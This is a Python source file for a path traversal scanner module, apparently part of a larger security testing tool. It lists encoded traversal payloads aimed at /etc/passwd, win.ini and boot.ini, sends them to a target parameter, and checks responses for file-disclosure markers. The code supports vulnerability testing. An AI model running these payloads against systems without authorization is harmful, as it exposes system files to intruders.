"""
Path traversal scanner module.

Sends a list of path traversal payloads against a target parameter and
checks the response for OS file-disclosure markers.
"""

import urllib.parse

from core.http_client import HTTPClient
from core.report import Report

DEFAULT_PAYLOADS = {
    "linux": [
        "../../../../etc/passwd",
        "..%2f..%2f..%2f..%2fetc%2fpasswd",
        "....//....//....//....//etc/passwd",
        "..%252f..%252f..%252f..%252fetc%252fpasswd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "/etc/passwd",
        "../../../../etc/passwd%00.png",
        "../../../../etc/passwd%00",
        "../../../../../etc/passwd",
        "../../../etc/passwd",
        "/var/www/images/../../../etc/passwd",
    ],
    "windows": [
        "..\\..\\..\\..\\windows\\win.ini",
        "..%5c..%5c..%5c..%5cwindows%5cwin.ini",
        "....\\\\....\\\\....\\\\....\\\\windows\\\\win.ini",
        "..\\..\\..\\..\\boot.ini",
        "../../../../windows/win.ini",
        "..%2f..%2f..%2f..%2fwindows%2fwin.ini",
        "C:\\windows\\win.ini",
        "..\\..\\..\\..\\windows\\system.ini",
    ],
}

SUCCESS_MARKERS = {
    "linux": ["root:x:0:0:", "daemon:x:"],
    "windows": ["[fonts]", "[extensions]", "for 16-bit app support"],
}


def build_payloads(target_os):
    if target_os == "all":
        payloads = []
        for payload_list in DEFAULT_PAYLOADS.values():
            payloads.extend(payload_list)
        return payloads
    return DEFAULT_PAYLOADS.get(target_os, DEFAULT_PAYLOADS["linux"])


def build_success_markers(target_os):
    if target_os == "all":
        markers = []
        for marker_list in SUCCESS_MARKERS.values():
            markers.extend(marker_list)
        return markers
    return SUCCESS_MARKERS.get(target_os, SUCCESS_MARKERS["linux"])


def run(args, client: HTTPClient):
    payloads = args.payloads or build_payloads(args.target_os)
    success_markers = build_success_markers(args.target_os)
    report = Report("path_traversal")

    print(f"[*] Scan start: {args.url} (Parameter: {args.param})")
    print(f"[*] Payloads to try: {len(payloads)}\n")

    for payload in payloads:
        if args.method.upper() == "GET":
            target_url = f"{args.url}?{args.param}={urllib.parse.quote(payload, safe='../%')}"
            response = client.get(target_url)
        else:
            response = client.post(args.url, data={args.param: payload})

        if response is None:
            continue

        for marker in success_markers:
            if marker in response.text:
                report.add_finding(
                    payload=payload,
                    marker=marker,
                    url=response.url,
                )
                break

    report.summarize()
    return report
